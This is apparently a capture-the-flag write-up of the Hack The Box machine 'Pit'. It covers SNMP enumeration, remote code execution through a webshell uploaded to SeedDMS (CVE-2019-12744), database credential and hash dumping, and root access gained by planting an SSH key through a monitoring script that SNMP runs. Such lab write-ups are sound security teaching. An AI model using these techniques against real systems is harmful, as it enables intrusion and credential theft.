> Authors: **[polarbearer][author-profile-1]** & **[GibParadox][author-profile-2]**

## Discovery

### Port scanning

```bash
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
80/tcp   open  http            nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
```

```bash
PORT    STATE    SERVICE  VERSION
161/udp open     snmp     SNMPv1 server; net-snmp SNMPv3 server (public)
162/udp filtered snmptrap
```

### Web browsing

Actually port 9090 is another webserver, with an index page full of JS. It
hides a few tags on the resulting page:

![][hidden-tags]

The JS is lightly obfuscated / minimized, making use of a "Cockpit" library:

```javascript
/* Some browsers fail localStorage access due to corruption, preventing Cockpit login */
```

Indeed, it stores some data on the client side:

![][local-storage]

Whatweb gives a little more details:

```bash
Whatweb http://pit.htb/
# http://pit.htb/ [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
whatweb http://pit.htb:9090/
# https://pit.htb:9090/ [200 OK] Cookies[cockpit], Country[RESERVED][ZZ], HTML5, HttpOnly[cockpit], IP[10.10.10.241], PasswordField, Script, Title[Loading...], UncommonHeaders[content-security-policy,x-dns-prefetch-control,referrer-policy,x-content-type-options,cross-origin-resource-policy]
```

The page uses OAuth:

```javascript
var s = u.OAuth || null;
if (s) {
    if (!s.TokenParam) s.TokenParam = "access_token";
    if (!s.ErrorParam) s.ErrorParam = "error_description";
}
```

### SNMP walk

The Nmap scan grabbed the community string, making way for enumeration. There
are a **lot** of informations: process names, ids, arguments, path, users, etc...

```bash
snmpwalk -v 1 -c public 10.10.10.241 .iso.3.6.1 | tee discovery/mib
grep -ia user discovery/mib
# SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
# guest_u         user       s0         s0                             guest_r
# root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
# staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
# sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
# system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
# unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
# user_u          user       s0         s0                             user_r
# xguest_u        user       s0         s0                             xguest_r
# Login Name           SELinux User         MLS/MCS Range        Service
# michelle             user_u               s0                   *
grep -ia ssh discovery/mib
# HOST-RESOURCES-MIB::hrSWRunParameters.1108 = STRING: "-D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128"
grep -ia html discovery/mib
# UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddms
```

## Breaking-in

The path `/var/www/html/seeddms51x/seeddms` is served on the web: it is a
document sharing platform.

The credentials `michelle:michelle` previously harvested work:

![][seeddms]

Taking the hint and looking for CVEs on SeedDMS, CVE-2019-12744 stood out:

```
Exploit Steps:                                                                   
                                                                                 
Step 1: Login to the application and under any folder add a document.            
Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
Step 3: Now after uploading the file check the document id corresponding to the document.
Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.
                                                                                 
Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
```

The URL is exactly is advertised: `http://dms-pit.htb/seeddms51x/data/1048576/38/1.php?c=id`.

![][upload-folder]

Leading to RCE:

![][rce]

```
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
michelle:x:1000:1000::/home/michelle:/bin/bash
```

## Moving on

After browsing a while I stumbled on:

```xml
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
```

Next:

```bash
/usr/bin/mysql -u'seeddms' -p'ied^ieY6xoquu' -D'seeddms' -e'show tables;'
# Tables_in_seeddms
# tblUserPasswordHistory
# tblUserPasswordRequest
# tblUsers
/usr/bin/mysql -u'seeddms' -p'ied^ieY6xoquu' -D'seeddms' -e'select * from tblUsers;'
# 1   admin   155dd275b4cb74bd1f80754b61148863    Administrator   admin@pit.htb   en_GB           1   0   NULL    0   0   0   NULL
# 2   guest   NULL    Guest User  NULL                2   0   NULL    0   0   0   NULL
# 3   michelle    0d8693435cfd30d3cdf295214da5c930    Michelle    michelle@pit.htb    en_GB   bootstrap       0   0   2021-09-28 18:23:31 0   0   0   NULL
# 4   jack    682d305fdaabc156430c4c6f6f5cc65d    Jack    jack@dms-pit.htb    en_GB   bootstrap       0   0   NULL    0   0   0   NULL
```

These are most likely MD5 hashes (32 chars etc).

Also the DB password works on `http://pit.htb:9090/` with user "michelle".

And there's actually a legit webshell!!

![][webshell]

## Escalation

In the SNMP scan output, the user information came from a "monitor" process:

```
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
```

```bash
cat /usr/bin/monitor
# for script in /usr/local/monitoring/check*sh
# do
#     /bin/bash $script
# done
ls -lah /usr/local/monitoring/
# ls: cannot open directory '/usr/local/monitoring/': Permission denied
echo _ > /usr/local/monitoring/heyhey && ls -lah /usr/local/monitoring/heyhey
# -rw-rw-r--. 1 michelle michelle 2 Sep 19 06:31 /usr/local/monitoring/heyhey
echo $'cp /root/root.txt /home/michelle/heyhey && chown michelle:michelle /home/michelle/heyhey' | /usr/local/monitoring/check-flag.sh
```

The previous SNMP scan shows that the monitor process will start on SNMP read queries:

```
NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
```

```bash
snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects
# NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: cp: cannot stat '/root/root.txt': Permission denied
# NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: cp: cannot stat '/root/root.txt': Permission denied
```

Another try:

```bash
echo $'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGn1kPrfCXCNR8Kxtlw3aM3CaaAGGVIIoZNmOfki/3k4rD5WTAw+XVa2gFCeTE/9xNsOAPxJh18hV9dYe1Lfk9ne55HsD2CCWtk/Gs7coYRdVfdDdM7ZzAjDcrXnJ+JFWY6DQAxVbG2S6defxVmhnLvTKtwb62vdFZ8dcQCs3yGTRLmaBz0ZSDUGUs2ZC+dTNVGMhqksnlwXMVnpStzRCjtw+bOAC6v95b6L9TF38qnMKbTz4OQqCpjPR8ET5CnCt3uCKsQxETTwD/B6wHP1cJ3GMcgrFwAZB20Uvoif1kM901oa7oeQDU2wXSCSADeq8RfBI3/Zd7GAGDicsBao7p" > /root/.ssh/authorized_keys' > /usr/local/monitoring/check-ssh.sh
```

[author-profile-1]: https://app.hackthebox.eu/users/159204
[author-profile-2]: https://app.hackthebox.eu/users/125033

[document-id]: images/document-id.png
[hidden-tags]: images/hidden-tags.png
[local-storage]: images/local-storage.png
[rce]: images/rce.png
[seeddms]: images/seeddms.png
[webshell]: images/webshell.png
